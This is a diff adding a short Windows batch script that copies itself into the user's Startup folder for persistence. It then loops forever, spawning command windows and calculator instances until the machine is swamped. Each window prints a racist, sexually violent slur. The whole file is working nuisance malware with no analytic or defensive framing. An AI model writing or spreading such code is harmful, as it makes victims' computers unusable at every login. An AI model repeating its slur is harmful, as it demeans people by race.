@@ -1,0 +1,12 @@
+ÿþ&cls
+@echo off
+if "%~dp0"=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" goto :main
+
+move /y "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
+start "" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0"
+exit
+
+:main
+start cmd /k echo get raped nigga
+start calc.exe
+goto :main
